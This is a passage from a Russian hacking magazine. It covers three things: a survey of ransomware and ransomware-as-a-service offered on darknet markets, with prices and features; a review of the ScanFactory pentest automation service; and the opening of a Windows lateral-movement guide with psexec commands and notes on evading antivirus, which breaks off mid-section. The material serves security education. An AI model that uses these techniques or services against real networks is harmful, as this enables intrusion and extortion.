рамма‐шантажист по итогам четвертого квартала 2019 года. Вре донос
генери рует уникальный ID и клю чи для каждого устройства, зашифровывает
файлы, меня ет обои на рабочем столе и выводит на экран инструкцию
по дешифровке, в которой указан URL‐адрес формы для восста новления
доступа к данным.


3. Пакет исходных кодов программ вымогателей за 15 евро
Состоит из:
 • Skiddy ScreenLocker — копия трояна Exotic;
 • NxRansomware — Open Source проект, загружен на GitHub в 2016 году;
 • HiddenTear — пер вый троян‐вымогатель с открытым исходным кодом,
   выложенный на GitHub в 2015 году;
 • MyLittleRansomware — очередной опенсорс, разработанный в 2018 году;
 • Jigsaw Ransomware — идентифицирован в 2016 году, назван в честь куклы
   Билли из «Пилы»;
 • EDA2 Ransomware — собран на базе конструктора EDA2 и тре бует фик‐
   сирован ную плату за расшифровку — 0,1 BTC;
 • CryptoLocker — леген дарный старичок, сумевший заставить американских
   копов раскошелиться на 500 долларов;
 • Andr0id L0cker — мобильный вымогатель, который блокирует доступ
   к Android;
 • Shark Ransomware — был запущен как RaaS в клирнете в 2016 году.

К слову, Andr0id L0cker — единствен ный мобильный вымогатель, выставлен‐
ный на продажу на посещенных мной теневых рынках.


4. WannaCry за 150 долларов
Троян «ХочуП лакать» еще рано хоронить, ведь в первом квартале этого года
на его долю пришлось 40,5% обнаруженных слу чаев заражения. Но после
эпидемии вируса в 2017 году Microsoft выпустила патчи для версий ОС вплоть
до XP, где была устранена уязвимость, которую эксплуатировал WannaCry.
Поэтому первоначальная сборка программы‐шантажиста уже не может уста‐
новить бэкдор для загрузки и запуска исполняемого файла на подав ляющем
большинстве компьютеров.


5. Модульный троян LimeRAT за 89 евро
Многофункци ональ ный вредонос, разработанный для шифрования данных
на жес тком диске и флеш ках, установки майнера XMR, кражи данных о крип‐
токошельках и выполнения DDoS‐атак. Распространяется через файлы Excel
и USB‐накопители, умеет самоудаляться, если обна ружит виртуальную
машину.





6. Исходный код Blackmail Bitcoin Ransomware кастомной сборки
за 15 долларов
Любопытный вариант вре доноса, который можно использовать как обычный
шифровальщик и инструмент для кражи Bitcoin. В режиме вымогателя прог‐
рамма шиф рует файлы на устрой стве и требует выкуп. В формате стилера
троян распозна ёт адреса BTC в буфере обмена и модифицирует их. Если
жертва скопипастит и не проверит адрес, то битки уйдут в кошелек хакера.


7. Модульный вредонос DiamondFox за 1000 долларов
Версия DiamondFox, выпущенного в 2017 году, с обновлениями от 17 мар‐
та 2020 года. Распространяется толь ко с помощью USB‐накопителей и сос‐
тоит из девяти элементов:
 • Cookie Grabber — ворует куки из бра узеров Firefox, Google Chrome и Mi‐
   crosoft Edge;
 • Botkiller — находит и удаляет вредоносные скрипты;
 • Video Recorder — записывает действия юзера на экране;
 • программа‐шантажист — автоматически рас шифро вывает данные после
   подтверждения перево да выкупа;
 • криптовалютный стилер — меняет адреса BTC, BCH, LTC, ETH, DOGE,
   DASH, XMR, NEO и XRP;
 • кейлоггер — регистрирует и передает информацию о нажатии кла виш,
   привязан ную к дате и времени;
 • файл‐стилер — скачивает файлы выб ранного фор мата и определенного
   размера;
 • стилер паролей из браузеров и мессендже ров;
 • бот для Windows x64 и x86.

Дилер не опубликовал под робную информацию о программе‐вымогателе.
Но, учи тывая ее низкую стоимость (60 дол ларов), рискну пред положить, что
это опенсорсный проект или модификация устаревшей мал вари.


8. Ransomware 2020 за 49 долларов
Продавец не написал название вре доноса, но заявил, что он был создан
в 2020 году и его не может обнаружить ни один антивирус. По словам вен‐
дора,  мал варь  использует  алгоритм шифрования  AES  и  открывает
на зараженном компьютере текстовый файл с требованием о выкупе в крип‐
товалюте.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   ВЫМОГАТЕЛЬСТВО
          КАК УСЛУГА
          КТО И ЗА СКОЛЬКО ПРЕДЛАГАЕТ В ДАРКНЕТЕ
                 ПОМОЧЬ С ВЫМОГАТЕЛЬСТВОМ





9. Blackmail Bitcoin Ransomware с исходным кодом за 40
долларов
Программа‐вымогатель распространяется через флешки и установоч ные
файлы, скачанные в интернете. Для USB‐накопителя существует опция авто‐
матического запус ка вре доноса через определенный временной промежу‐
ток. Особенно при ятно, что в комплект вхо дит руководство по применению.





10. Исходный код пяти программ-шантажистов Bitcoin Ran-
somware за 18 долларов
В эту подборку включены современные вредоносы, а также инс трукции по их
конфигурации и распространению. Названия малвари держатся в секрете,
но вендор сообщил, что все программы новые и подходят для вымога тель‐
ства вир туальных валют.
  А вот русский даркнет, как обычно, разочаровал. На русскоязычных тор‐
говых площадках и форумах не про дают программы‐вымогатели и не пре дос‐
тавляют услуги орга низации атак, потому что модераторы платформ банят
за RaaS. Куда ни кинь, везде только вещества, кардинг и пробивы.


ШАНТАЖ ПОД КЛЮЧ
Сейчас в дар кве бе работа ют две пол ноценные платформы RaaS, созданные
для автоматизации и оптимизации распространения малвари и получения
выкупа. У пло щадок разный modus operandi и условия сотрудничества, но их
объединяет одно — девелоперы не продают исходный код вредоносов.


Ranion
Владельцы площадки предлага ют при обрести сервисный пакет, в который
входят:
 • расположенная в Tor панель управления для менед жмента ключей;
 • расшифровщик;
 • аддон для перевода текста баннера с требованием о выкупе на опре‐
   деленный язык и добавления расширений файлов в спи сок поддержи‐
   ваемых.

Чтобы получить дос туп к услуге, владельцы просят перевести день ги в Bitcoin
и отправить письмо на их элек тронную поч ту, сообщив свой адрес BTC, сумму
выкупа, email для связи с клиентами и список аддонов. После подтверждения
платежа владельцы площадки обещают выслать:
 • исполняемый файл программы‐вымогателя для устройств на Windows
   x86 и x64, которая применяет алгоритм шифрования AES;
 • декриптор для расшифровки данных;
 • ссылку на панель управле ния в дарквебе.

После запуска экзешника на компьюте ре жертвы мал варь зашифрует все
файлы с 43 рас ширениями из списка (например, .txt, .docx, .jpeg и .rar), сге‐
нерирует ключ и отправит его в панель управления. На мониторе зараженной
машины появится сообщение с требованием о выкупе. В предуп реждении
будет указан адрес криптокошелька и email для свя зи. Если пострадавший
не переведет бит ки за семь дней, то ключ для дешифровки будет удален.





Получив криптовалюту от жер твы, атакующий должен запус тить декриптор,
вставить ключ жертвы и выбрать опцию Decrypt My Files. После этого файлы
будут автомати чески расшифрованы.





Вредонос под держивает опцию отло женного запуска и шифрования, отклю‐
чает диспетчер задач, меня ет обои на рабочем столе и отслеживает IP
устройства. Помимо  этого,  предлагается  приобрести  дополнительный
обфускатор и уникальный .onion‐адрес (будет написан на баннере) за 90 дол‐
ларов. Подписка на сервис на один месяц стоит 120 долларов, на шесть
месяцев — 490 долларов, на год — 900 долларов.
  По словам  авторов проекта, 85%  антивирусов не  находят  Ranion,
оставшиеся 15% вносят файл в список подозрительных или нежелательных
программ. Разработчики регулярно апдей тят вредонос и обещают рассылать
обновленные  версии  подписчикам  на  электронную  почту.  Последний
на момент написания статьи апгрейд был выпущен в сентябре 2020 года.
Девелоперы утверждают, что распространяют ПО сугубо в научных целях,
чтобы снять с себя ответственность за незаконные дей ствия клиентов.
   Сотрудники сай та Virus Total установили, что в 2017 году экзешник Ranion
детектировали 41 из 60 антивирусов. Версию RANION v1.11, выпущенную
в сентябре 2020 года, на данный момент еще не проверяли. Мал варь
не шиф рует теневые копии файлов, благодаря этому данные можно вос ста‐
новить с помощью бэкапа. Тем не менее информацию не получится рас‐
шифровать декрипторами, разработанными экспертами по кибербезопас‐
ности, потому что вредонос создает уни кальные ключи.


Smaug
Площадка была открыта в мае 2020 года и позиционирует себя как ведущий
проект в сфе ре RaaS. Регистрация на платформе стоит 0,2 BTC (2137 дол‐
ларов по текущему курсу). После внесения платежа пользователь получа ет
доступ к учетной записи и может соз дать кам панию по заражению компьюте‐
ров, выб рав одну из двух опций:
 • обычная (для каждого устройства создается уникальный ключ);
 • институциональная (шиф рует данные на нес кольких гаджетах, используя
   один ключ).





Судя по инс трукции, каждой кампании можно присвоить произвольное наз‐
вание, ввести раз мер выкупа в Bitcoin, написать сообщение, которое будут
видеть жертвы, и задать срок действия. Затем нужно выбрать операционную
систему (Windows, Linux или macOS), нажать на кнопку Create и скачать
исполняемый файл программы‐вымогателя.





Вредонос шифрует файлы на устройстве жертвы и откры вает тексто вый
документ, в котором указана ссыл ка на пор тал Smaug.





Сервис предоставляет ключ для декрипта информации после перево да необ‐
ходимой сум мы в BTC, но дает возможность расшифровать один файл бес‐
платно в тестовом режиме. Платформа взи мает комис сию 20% за все тран‐
закции и автоматически начисляет Bitcoin в кошелек агента. Smaug ведет ста‐
тистику кампании по трем показателям: сум ме выплат, числу посетителей
и количеству пла тежей.





Малварь шифрует информацию  только на жестком диске компьютера
и самостоятельно не рас пространяется по локальной сети, чтобы сократить
вероятность обна ружения анти вирусом. Разработ чики Smaug запреща ют
выполнять атаки на территории стран СНГ, кроме того, сервис начали
пиарить на русскоязычном форуме в даркнете, поэто му складывается впечат‐
ление, что за созданием платформы стоят выходцы из Содружества. Сервис
берет высокую комиссию и огромную плату за регистрацию, но сер вер сайта
работает нестабиль но и периодичес ки отключается. То ли с поддержкой
не все глад ко, то ли конкуренты дидосят.
  В конце сен тября работники Virus Total протестировали эффективность
использования  антивирусов  для  борьбы  со  Smaug  и  выяснили,
что 44 из 67 программ смог ли его идентифицировать. Вредонос удаляет
исходные фай лы после шиф рования и генерирует уникаль ные ключи, поэтому
декрипторы не работа ют. Из‐за этого постра давшим, которые хотят восста‐
новить дос туп к информации, не остается ничего иного, кроме как заплатить
выкуп. Однако вирус не удаляет резервные и теневые копии файлов, поэтому
бэкап — самая надежная защита от Smaug.


ВЫВОДЫ
Стать низшим звеном в кибер прес тупной пирами де в наши времена легче
легкого, и цены на вредоносное ПО начинаются с несерьезных 15 долларов.
Но, я думаю, ты отлично понимаешь, почему разработчики прог рамм‐вымога‐
телей вместо того, что бы применять свои творения, продают их по подписке
подобно Oﬃce 365 и Adobe CS. Стоит записаться в эту очередь, и ты гаран‐
тированно ста нешь крайним.
ВЗЛОМ





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity
     КОНВЕЙЕР
 ДЛЯ ПЕНТЕСТА
 ЗНАКОМИМСЯ С СЕРВИСОМ SCANFACTORY
  И АВТОМАТИЗИРУЕМ ОБХОД ПЕРИМЕТРА




Каждый безопасник рано или поздно задумы вается об авто‐
мати зации сво ей работы. С такими же задачами столкнулись
Владимир Иванов и Анатолий «c0rv4x» Ива нов. Они начали
с неболь ших шагов по авто мати зации рутин ных пентестер‐
ских задач и их монито ринга, а затем прев ратили свои
наработ ки в сер вис ScanFactory. Редакция «Хакера» пооб‐
щалась с Владимиром Ивановым и самостоятельно опро‐
бовала сервис.


Неважно, занимаешь ся ли ты аудитом, работаешь безопас ником или участву‐
ешь в программах багбаунти, — на первом этапе пентеста часто ты будешь
проводить одни и те же подготови тельные действия: собирать поддомены,
сканировать айпишники, перебирать директории и так далее. Автоматизиро‐
вать все это край не соблазнительно. Задал парамет ры, нажал кнопку «ска‐
нировать» — и можно продолжать занимать ся своими делами, пока не придут
отчеты.
  Создатели ScanFactory, как и другие пентесте ры со стажем, тоже столкну‐
лись с этой задачей и сначала ста ли решать ее для себя, а затем это выросло
в нечто большее.


        WWW

                            Project Black — опенсор сный проект, созданный
                      Анатолием Ивановым во время работы в Positive
                          Technologies.


«ScanFactory создавался в первую очередь как продукт, который призван эко‐
номить вре мя и деньги компании. Он будет полезен как blue team, так и red
team — людям, которые выполняют оди наковые задачи в области тестирова‐
ния инфраструктуры на проникновение», — говорит Вла димир Иванов. «Мы
очень гор ды нашим творением, — продолжает он. — И даже немножко
страшно от возможностей, которые мы получили, потому что мы покрываем
большинство сценари ев базового пен тестерского ауди та».
  Сейчас ScanFactory находится в стадии стабильной беты и уже исполь‐
зуется в качес тве пилотов в компаниях. Как в любом B2B‐продукте, все воп‐
росы реша ются индивиду ально с клиентом, проект выстраивает ся под его
нужды и, по сло вам раз работ чиков, запускается в течение дня. Также они
готовы разрабатывать и интегрировать фичи, которые могут понадобить ся
крупному кли енту.


ЧТО МОЖНО АВТОМАТИЗИРОВАТЬ?
Если задать ся воп росом, что вообще делает пентестер, то в общих чертах
можно ответить так: он, опираясь на опыт, ищет вариант взаимодействия
с приложением, не предусмотренный логикой, и про бует раскрутить его
до полноценной уяз вимости. Поэто му первая задача — в том, что бы собрать
как можно боль ше точек вхо да в исследуемую инфраструктуру.
  На этом этапе обнаружи вается одна из слабос тей человека — он
не может пос тро ить в голове граф из всех вариантов того, где потенциально
могли бы быть уязвимости на внешнем периметре. Человеческие возможнос‐
ти ограничен ны!
  Поэтому случается так, что некоторые уязвимости проходят мимо глаз
исследователей и долгое время остаются ненайденными. В аудите очень
важны личные качества человека (насколько он усер ден, к при меру) и его
опыт: с какими вариантами необычного поведения приложений он сталкивал‐
ся и какие способы их эксплуатации уже применял.
  Для автоматизации, конечно же, существует самый разный софт, при чем
выбор инс тру мен тария есть почти в каж дой из областей. В нашем рас‐
поряжении — веб‐сканеры (Burp, Acunetix, Netsparker), инфраструктурные
сканеры (Nessus), а также всевозможные сетевые сканеры, дирбастеры, ска‐
неры CMS и прочее. Почти каждый день появляется что‐то новое. Если авто‐
матизировать все, что существует, это позволит сильно расширить покрытие
того самого графа уязвимостей.
  На человека при этом ложится задача свя зать между собой все эти средс‐
тва. Гру бо говоря, выходные данные одной программы дол жны поступать
на вход другой, а ее результаты работы — следующей. Но у этих программ
нет  какого‐то  единого  высокоуровневого  интерфейса,  и  они  обычно
не задума ны как часть какого‐то набора. Следова тельно, автомати зация ста‐
новится нет риви аль ной задачей. «Мы программно соеди нили проги, которые
никто рань ше не мог соеди нить», — с гордостью сообщает Владимир Ива‐
нов.
  Идея решить эту задачу лежит в основе ScanFactory. Если обоб щить, то
ScanFactory — это SaaS для автоматизированной оценки защищен ности
внешней инфраструктуры. Он сканирует периметр, обнаруживает проблемы
безопасности и опо вещает о них, а также выпол няет мониторинг для отсле‐
живания новых проблем в будущем.


КАК РАБОТАТЬ СО SCANFACTORY
Давай для начала представим себе сферичес кий пентест в вакууме. Заказчик
говорит, что в скоупе все поддомены основного сайта компании, нап ример
*.company.corp.
  Наши действия будут следующими.
 1. Составля ем список всех под доменов и получа ем их IP‐адреса.
 2. За пус каем сканер портов, например Nmap. На вход отправляем IP из пре‐
   дыдущего шага, а на выходе получаем открытые пор ты и список запущен‐
   ных сервисов.
 3. Най ден ные веб‐сервисы отправляем в дир бастер, чтобы соб рать инте‐
   ресные фай лы и директории, а на бинарных — брутим пароли.
 4. Проходим ся по веб‐сервисам краулером с целью собрать формы, домены
   и HTTP‐запросы. Для каждого нового домена повторим алгоритм с шага 2.
 5. HTTP‐запросы отправляем в фаззер, чтобы найти скрытые параметры
   и проанализировать их. И дальше в таком же ключе.

При исполь зовании ScanFactory все эти действия выполняются в несколько
кликов.  Создаем  новый  проект  и  указываем  скоуп  со  звездочкой:
*.company.corp.





               Создание нового проекта в ScanFactory

Здесь же можно указать черный список IP‐адре сов и доменов, находящихся
вне скоупа.
  Затем на стра нице проекта достаточно просто нажать на кнопку запуска.





                   Страница про екта в ScanFactory

Теперь мож но заваривать кофе и заниматься другими делами в ожидании
результатов. Пример отсканированного проекта с най денными уязвимостями
ты можешь увидеть на странице с Live Demo.





           Страница ScanFactory с найденными уязвимос тями


КАК SCANFACTORY ИЩЕТ СЛОЖНЫЕ УЯЗВИМОСТИ
Вот как Владимир Ива нов описывает сценарий, в котором ScanFactory поз‐
воляет найти, про верить и рас крутить цепочку из нескольких уязвимостей,
которая при ручном сканировании, ско рее всего, осталась бы незамеченной:



      У нас есть осно ван ный на Selenium краулер, который ходит по сай там.
     Он заходит на сайт, рен дерит страницу и видит, что там автомати чес-
      ки под гру жает ся файл на JS. Кра улер смот рит внутрь него и видит,
      что в комментариях к скрип ту раз работчик оставил ссылку или домен
      какого‑то тестового стен да, который еще нигде не встречал ся и о
      котором не было извес тно.
         Этот домен помещается в базу. Далее пла ниров щик видит, что
      в базе появил ся новый домен. Он берет этот домен и соз дает список
      задач уже для него. Сканиру ются порты, и дирбастер находит скрытую
      папку со скриптами. В одном из них — давно забытая POST-форма.
     Спе циальная утилита находит в фор ме скры тый параметр, при отправ-
      ке которого ответ на стра нице изменится.
       Полученный HTTP-зап рос со скры тым парамет ром  сох раня ется
      и отправ ляется в BurpSuite, который и находит SQL-инъекцию.





  Еще один сценарий уязвимости, которую может обнаружить ScanFactory

Во время одного из первых тестов парни столкнулись с проблемой сканиро‐
вания сайтов с большим количеством похожих страниц. Например, в блогах
и новостных сайтах они могут исчисляться тысячами. Поэтому схожие стра‐
ницы нужно игнорировать, а атаковать достаточно одну. Чтобы сравнивать
страницы меж ду собой, в ScanFactory используют технологию Fuzzy Hashing
на основе алгорит ма SimHash, который применяется в Google.


             INFO

                      SimHash на основе элементов HTML‐дерева счи‐
                         тает хеш‐функцию так, что у двух похожих стра‐
                      ниц будут похожие хеши. Если страницы отли‐
                      чаются меньше, чем на порого вое значение, то
                        соответствующие запросы можно не сканировать
                      дважды. Но как определить пороговое значение —
                      тема для отдельной статьи.


Также для каждого клиента сис тема автоматически генери рует специальные
словари. Во время обхода сайтов краулер вытас кивает из страниц часто
встречающиеся клю чевые слова. Получается спи сок слов, специфичных
для ком пании и сферы деятельности. Эти словари используются во время
брутфорса паролей, а также для поиска скры тых поддоменов.


АРХИТЕКТУРА SCANFACTORY
Внутри у ScanFactory — сложная система взаимодействующих пен тестер ских
утилит, всего их более 20 штук. Каждая утилита запускает ся в отдельном
Docker‐контейнере, а управлением системы занимается ядро. В ядре опи‐
сано, как именно происходит ска нирование, вся последовательность запуска
программ, частота срабатывания каждой из них и прочие опции для каждой.


Список используемого софта

 • Burp Suite + 12 плагинов
 • Nessus
 • Amass + шесть платных API
 • GoAltdns
 • Nmap
 • Nuclei
 • Краулер на основе Selenium
 • Dirsearch
 • ﬀuf
 • Patator
 • SubFinder
 • subjack
 • waybackurls
 • WPScan



Важная задача, которую удалось решить разработчикам, — это приоритиза‐
ция задач. В основе ScanFactory лежат очереди. Как толь ко появляется HTTP‐
запрос, в котором, например, есть форма с интересными параметрами, то
задача его обработки становится при ори тетной — сер вис будет ска нировать
такую стра ницу раньше дру гих.
  Для каждой ути литы, бесплатная она или коммерческая, написа на обертка
на Python. Она подписывается на очередь и через оче редь получает новую
задачу — ссылку на какой‐то внутренний объект. Объекты бывают разных
типов: про екты, хосты, HTTP‐зап росы и другие. Обертка их принимает, ана‐
лизирует и на выход отда ет данные, которые приводят ся к одному виду,
а затем проходят через ряд внут ренних мик росервисов. В кон це данные сох‐
раняются в MongoDB.
  Через микросер висы реализованы все дополнительные фичи, в том числе
упомянутое сравнение похожих страниц, поиск данных в HTTP‐ответе и про‐
чее. Например, когда нашелся новый домен, нужно про верить, входит ли он
в скоуп, определить приоритет его сканиро вания и выпол нить другие опе‐
рации. Все это делается с помощью микросервисов.
   Чтобы упростить масштабирование, разработчики используют Kubernetes.
Эта тех нология позволяет ScanFactory масшта бировать ресурсы в зависи‐
мости от количества задач в очереди. Например, если нужно просканировать
пул IP‐адресов, для этого сначала увеличивается число контейнеров Nmap,
потом число контейнеров с обработчиком HTTP‐ответа, а затем ресурсы
освобождаются, пока система ждет сле дующих задач.
  За два года разработки ребятам удалось решить огромное количество
возникающих проб лем. Как спроектировать модель данных? Как оптимально
хранить HTTP запросы и ответы? Как расстав лять при ори теты для задач ска‐
нирования? Как обнаруживать ано малии во время фаззинга? Как оптимизи‐
ровать сканирование больших проектов? Как нормализовывать резуль таты
работы раз ных программ?


КОНКУРЕНТЫ
«Наша команда постоянно мониторит ИБ‐комьюнити  в поис ках новых
методов для решения задач. Это важ ный процесс, потому что каждый день
появляется что‐нибудь новое, а мы хотим, чтобы наш продукт был компиляци‐
ей лучших техник из того, что есть сей час», — рассказывает Ана толий Иванов.
  Именно поэтому архитектуру интегра ции новых утилит разработчики ста‐
раются сделать мак симально прос той, чтобы можно было добавлять новую
утилиту за несколько дней. «Новые решения, программы или технологии лег‐
ко интегрировать. Будь то самописная утилита, свежий эксплоит или набор
репортов с багбаунти», — объясняет Ана толий.
   Главное отличие ScanFactory от конкурентов — это как раз прозрачность
в выборе софта и алгоритмов работы. Чаще всего такие решения проп‐
риетарные, например Nessus фир мы Tenable или Qualys WAS. С ними никогда
не зна ешь, что они будут делать после нажатия на кнопку Scan.
  «Чаще все го такие решения рассматривают каж дый объект внешней
инфраструктуры как отдельный, то есть никак не свя занный с другими, — рас‐
сказывает Анатолий Иванов. — Грубо говоря, запускается один большой кон‐
тейнер, в котором воркеры выполняют один и тот же зашитый разработ‐
чиками перечень про верок для одного домена. Есть некий условный список
уязвимостей, который они пытаются обнаружить. А мы пытаемся научить сис‐
тему связывать раз нородные данные, раскручивая их до уязвимости, как это
делает пентестер».


ВПЕЧАТЛЕНИЯ
С точки зрения пентестера, сканер вроде ScanFactory — это потенциальный
помощник, которому можно было бы доверить рутинную часть аудита. Мне,
к примеру, всегда хотелось автоматизировать сбор и запуск все возможных
сканеров до уровня «задал скоуп и нажал кнопочку».
  Особенно интересно было следить, как одна за другой запускаются
и отрабатывают задачи и утилиты. Все это можно посмотреть в режиме
реального вре мени с графика ми и статистикой. После завершения ска ниро‐
вания получаешь график и ста тистику по найденным уяз вимостям и их уровню
опасности. На графике видно, когда и какие баги были найдены.





  Результаты сканиро вания про екта. Статистика най ден ных уязвимостей
  и их уровня опасности

Впрочем, наглядности в представлении найденной информации могло бы
быть и побольше. Я бы не  отка зался  видеть всю просканированную
инфраструктуру компании: что и на каком IP или домене нашлось. Сейчас
можно просматривать и выг ружать только то, что система посчитала алертом.
В этот же спи сок попада ют и результаты работы утилит.
  Зато ScanFactory позволяет посмотреть и выгрузить все алерты, которые
были най дены во время сканиро вания. Выг рузка алертов — это очень полез‐
ная штука, осо бен но для дальнейшей автоматизации. Нап ример, ска нер мож‐
но интегрировать с Jira, чтобы найденные проблемы сразу заносились туда.





             Найденные поддомены в алертах ScanFactory

В целом, конечно, этот продукт не совсем для меня. Он создавался как инс‐
трумент  для  компаний,  которые  хотят  усилить  безопасность  своей
инфраструктуры и иметь возможность отслеживать появ ляющиеся проблемы
безопасности.
  К примеру, если в продакшен по недосмотру админа вдруг начнет выг‐
лядывать что‐то, что выглядывать не должно, сканер обнаружит это и сразу
оповестит. Проблема не просуществует до следующего аудита или, чего доб‐
рого, взло ма. Да и аудит, между прочим, не дает полных гарантий: люди мыс‐
лят по‐раз ному, пользуются разными тулзами, обращают внимание на раз ные
аспекты и могут что‐то пропустить.
   ScanFactory, по сути, берет на себя рутину, которую обычно выполняют
безопасники со стороны вендоров. Отдать ее роботам — здравое решение.
Пускай обхо дят периметр 24 часа в сутки и 365 дней в году!
   Никто при этом не говорит, что ScanFactory заменит пла новые аудиты.
Автоматизация не найдет сложные логические баги, не в каж дой сис теме
справится с прег радами вроде аутентификации и не профаззит все методы
API (хотя над этим работают). Сканер — это еще одно хорошее крепкое звено
для построения и под держания безопасного продукта.
   Так что жела ем ребятам больших коммерческих успехов и ждем новостей
о потрясающих новых фичах.
ВЗЛОМ
 ГИД ПО
LATERAL


 ИЗУЧАЕМ УДАЛЕННОЕ ИСПОЛНЕНИЕ КОДА
     В WINDOWS СО ВСЕХ СТОРОН





                                                 s0i37
                                       Ведущий аналитик УЦСБ.
                                                    s0i37@ya.ru





Проникновение в атакуемую сеть — только пер вый этап
взлома. На вто ром этапе необ ходимо в ней закрепиться,
получить учетные записи пользователей и обес печить воз‐
можность  запуска про извольного  кода. В сегод няшней
статье мы поговорим о методах, позволя ющих добиться
этой цели, а также о том, как выпол няется боковое переме‐
щение в скомпрометированной сети.


             INFO

                     Читай также: «Кунг‐фу pivoting. Выжимаем мак‐
                     симум из пос тэкс плуатации».


После того как ты проник за внешний периметр и попал во внутреннюю сеть
компании, необ ходимо расширить в ней собственное присутствие, если
хочешь най ти там что‐то интересное. Как ни странно, чем больше размер
внутренней сети компании, тем проще ее взломать. И напротив, если ком‐
пания сов сем неболь шая, сеть взло мать порою крайне сложно. Почему так?
Чем больше сеть, тем больше в ней может встре титься уязвимых или небезо‐
пасно настроенных компонентов. При этом часто компрометация одного узла
влечет за собой ком прометацию сразу множества смежных с ним узлов.
  Во внутренних сетях обычно преобладают сер веры и рабочие станции
под управле нием Windows. В то же время эта ОС наибо лее интерес на с точки
зрения способов ком прометации, так как по умолчанию имеет множество
интерфей сов для удаленного выпол нения кода. Кроме того, атакующему дос‐
тупно большое количество спо собов извлечения учетных дан ных. Я не буду
касаться боково го перемещения по серверам Linux: они редко включены
в домен и не имеют такого раз нообразия дефолтных интерфейсов для уда‐
ленного администрирования. При боковом перемещении Linux интересен
главным обра зом как удобная точ ка опоры.
  Боковое перемещение подразуме вает легитимное удаленное исполне ние
кода. То есть все представленные в статье способы подразумевают наличие
действующей учетной записи для того или иного ПК. При этом почти всегда
будет тре бовать ся административная учетная запись.
  Основная задача при боковом переме щении — привлекать как можно
меньше внимания пользователей и службы безопасности, а также постарать‐
ся не вызвать тревогу у средств антивирусной защиты. Наиболее эффективно
использовать штатные средства операционной системы, то есть абсолют но
легитимные и неот личимые от действий обычных администраторов сети.
  Мы не будем обсуждать основные уязвимос ти Windows, атаки в локальных
сетях и способы поднять привилегии в среде Active Directory. Вместо этого
поговорим исключительно о легальных вещах: в каких потаенных уголках Win‐
dows можно найти учет ные записи и что с ними потом делать. Все представ‐
ленные даль ше спо собы не считаются уязвимостями, а представ ляют собой
трюки by design, следовательно, при грамотном исполнении это полностью
легальные процеду ры.
  Все примеры основаны на реальных ситуациях, с которыми можно стол‐
кнуться при перемещении по самым настоящим внутренним сетям. Поэтому,
как обычно, кос немся проблемы максимально тихого переме щения с воз‐
можностью байпаса антивирусов, а так же сделаем акцент на  то, какие
сетевые порты нам для этого потребуются.


СТРАТЕГИЯ БОКОВОГО ПЕРЕМЕЩЕНИЯ
Итак, боковое перемещение — это одновременное сочетание двух техник:
 • аутентифици рован ного уда ленного выполнения кода;
 • извлечения секретной информации после получения доступа.

Цикличное, последователь ное повторение этих шагов порою поз воляет
от одного‐единс твен ного взло манного ПК дойти до полной компрометации
всей сетевой инфраструктуры. Обычно боковое перемещение, как всякое
иное переме щение, преследует одну из следующих целей:
 • перехват управления контроллерами домена;
 • достижение изо лиро ванных критических сетевых сегментов (например,
  АСУ ТП, SWIFT);
 • поиск критической информации на ПК (сек ретные документы, платежные
   реквизиты и так далее).

Однако для достижения любой из перечисленных целей требуются все новые
учетные данные, чтобы  у атакующего была воз можность перемещаться
по сети и получать доступ ко все большему количес тву ПК. Продвижение
по внутренней сети ред ко обходится без взятия кон троллера домена, пос‐
кольку взятие домена озна чает автоматическое получе ние доступа прак‐
тически к каждому узлу сети. Что каса ется admins hunting, при дос тижении
контроллера домена может показаться, что поиск привилегированных учет‐
ных записей — это слепое угадывание. Но в действительнос ти инфраструк‐
тура Active Directory и сама Windows раскрывают достаточно информа ции
простому доменному пользователю, зачастую позволяя рассчитать нужное
направление продвижения и спланировать точ ную многоступенчатую цепоч ку
взломов еще в самом начале бокового перемещения.
  После взятия контроллеров домена иногда бывает необходимо двигаться
дальше — в некий особо охраняемый сегмент, представляющий собой объ‐
екты «биз нес‐риска». Это может быть сегмент АСУ ТП, вмешательство в тех‐
нологический процесс, доступ в сегмент SWIFT, если мы имеем дело с бан‐
ками, либо же просто доступ на ПК генерального дирек тора. В каждом слу чае
мы можем столкнуться с разными сложностями бокового перемещения,
о которых пойдет речь дальше.


УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОДА В WINDOWS
Рассмотрим несколько способов удаленного исполнения кода в Windows
с помощью учет ной записи. Некоторые средства пре доставляют удобный
интерактивный  режим,  а  некоторые —  толь ко  слепой  запуск команд
без получения результата. Начнем обзор с самых удобных и широко рас‐
пространенных инструментов и постепенно перейдем к менее популяр ным,
но все же спо соб ным исполнить код.
   Часть инстру ментов загружает на target исполняемый файл службы, пыта‐
ясь обеспечить нам удобный интерактивный режим. Но тут кроется опас‐
ность: такие сервисы зачас тую будут заб локированы анти вирусом. Плюс
к этому IP атакующего может быть заблокирован, что затормозит переме‐
щение. И SOC узнает о том, что в сеть кто‐то про ник.
   Большую часть боково го перемещения мы будем выполнять с помощью
замечательного Python‐пакета impacket. Для его установки требуется выпол‐
нить коман ду pip  install  impacket. После  установки необходимые
исполняемые фай лы будут находиться в папке impacket/examples, рас‐
положение которой под скажет команда pip show ‐f impacket.


MSRPC
Это реализация DCERPC от Microsoft. По сути, расширяет открытый DCERPC
при помощи дос тупа через именованные пайпы с использованием протокола
SMB. Главным образом использует 445‐й TCP‐порт. Перечис лить доступные
пайпы по словарю на SMB поможет модуль auxiliary/scanner/smb/pipe_auditor.


psexec.exe
 • Происхождение: sysinternals
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 135, 445, 4915x/TCP

Начиная говорить об удаленном исполнении кода в Windows, нельзя не упо‐
мянуть небезызвестный psexec от Марка Руссиновича. Данная программа
пользуется одинаковой популярностью и у администраторов, и у пентесте‐
ров. Принцип ее работы заключается в копировании исполняемого файла
через сетевой ресурс «ADMIN$» (445/TCP) с последующим удаленным соз‐
данием  и  запуском  службы  для  этого  исполня емого  файла  через
DCERPC (135,4915x/TCP). После  запуска  службы  происходит  обычное
сетевое вза имодействие с уда ленной командной строкой:


psexec.exe ‐u admin \\target cmd

Главный плюс для нас в том, что сер верный компонент psexecsvc.exe под‐
писан сертификатом Sysinternals (который принадлежит Microsoft) и, следова‐
тельно, стопроцентно легитим ная программа. Также к явным достоинствам
классического psexec.exe относится способность выполнять код в указанных
пользовательских сеан сах:


psexec.exe ‐u admin ‐i 2 \\target shutdown /l


psexec.py
 • Происхождение: Python‐пакет impacket
 • AV-риск: есть
 • Ис поль зуемые порты: 445/TCP

Отличная альтернатива для пользователей Linux. Однако этот инструмент
